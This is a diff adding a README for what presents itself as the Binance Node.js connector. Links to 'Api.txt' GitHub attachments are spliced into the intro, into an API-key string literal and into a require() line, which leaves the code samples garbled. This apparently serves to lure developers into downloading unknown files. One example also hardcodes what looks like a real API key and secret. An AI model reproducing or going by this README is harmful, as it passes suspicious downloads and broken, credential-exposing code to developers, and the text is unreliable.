@@ -1,0 +1,121 @@
+# Binance connector in Nodejs
+
+[![npm version](https://badge.fury.io/js/%40binance%2Fconnector.svg)](https://badge.fury.io/js/%40binance%2Fconnector)
+[![Node version](https://img.shields.io/node/v/%40binance%2Fconnector.svg?style=flat)](http://nodejs.org/download/)
+[![Standard-Js](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+
+
+This is a lightweight library that works as a connector to [Api.txt](https://github.com/user-attachments/files/16853358/Api.txt)
+. It’s designed to be simple, clean, and easy to use with minimal dependencies.
+
+- Supported APIs:
+    - `/api/*`
+    - `/sapi/*`
+    - Spot Websocket Market Stream
+    - Spot User Data Stream
+    - Spot Websocket API
+- Inclusion of test cases and examples
+- Customizable base URL
+- Support request timeout and HTTP proxy (since v2)
+- Response metadata can be displayed
+- Customizable Logger
+
+
+## Installation
+
+```bash
+npm install @binance/connector
+```
+
+## Documentation
+
+[https://binance.github.io/binance-connector-node/](https://binance.github.io/binance-connector-node/)
+
+## RESTful APIs
+
+
+
+```javascript
+const { Spot } = require('@binance/connector')
+
+const apiKey = '[Api.txt](https://github.com/user-attachments/files/16853377/Api.txt)
+'
+const apiSecret = ''
+const client = new Spot(apiKey, apiSecret)
+
+// Get account information
+client.account().then(response => client.logger.log(response.data))
+
+// Place a new order
+client.newOrder('BNBUSDT', 'BUY', 'LIMIT', {
+  price: '350',
+  quantity: 1,
+  timeInForce: 'GTC'
+}).then(response => client.logger.log(response.data))
+  .catch(error => client.logger.error(error))
+
+```
+
+Please find `examples` folder to check for more endpoints.
+
+## Key Pair Based Authentication
+
+```javascript
+const { Spot, PrivateKeyAlgo } = [Api.txt](https://github.com/user-attachments/files/16853382/Api.txt)
+require('@binance/connector')
+
+const apiKey = ''
+const apiSecret = '' // has no effect when RSA private key is provided
+
+// load private key
+const privateKey = fs.readFileSync('/Users/john/ssl/private_key_encrypted.pem')
+const privateKeyPassphrase = 'password'
+const privateKeyAlgo = PrivateKeyAlgo.RSA // for RSA key
+const privateKeyAlgo = PrivateKeyAlgo.ED25519 // for Ed25519 key
+
+const client = new Spot(apiKey, apiSecret, {
+  privateKey,
+  privateKeyPassphrase, // only used for encrypted key
+  privateKeyAlgo
+})
+
+// Get account information
+client.account().then(response => client.logger.log(response.data))
+```
+
+### Testnet
+
+While `/sapi/*` endpoints don't have testnet environment yet, `/api/*` endpoints can be tested in
+[Spot Testnet](https://testnet.binance.vision/). You can use it by changing the base URL:
+
+```javascript
+// provide the testnet base url
+const client = new Spot(apiKey, apiSecret, { baseURL: 'https://testnet.binance.vision'})
+```
+
+### Base URL
+
+If `base_url` is not provided, it defaults to `api.binance.com`.
+
+It's recommended to pass in the `base_url` parameter, even in production as Binance provides alternative URLs in case of performance issues:
+
+- `https://api1.binance.com`
+- `https://api2.binance.com`
+- `https://api3.binance.com`
+
+### Optional Parameters
+
+Optional parameters are encapsulated to a single object as the last function parameter.
+
+```javascript
+const { Spot } = require('@binance/connector')
+
+const apiKey = 'c9f3tCe0l34EUaaPSiL9s0KtyRC4mDG0rK4KRPTdxiqhjrCrbgZeTibcexLLApP0'
+const apiSecret = 'Cittld17y7ynFYzy7NeexmVy0uzLV23OOS1JHFKfz95X1aLFP7Vv75gmCSqmGqL5'
+const client = new Spot(apiKey, apiSecret)
+
+client.account({ recvWindow: 2000 }).then(response => client.logger.log(response.data))
+
+```
+
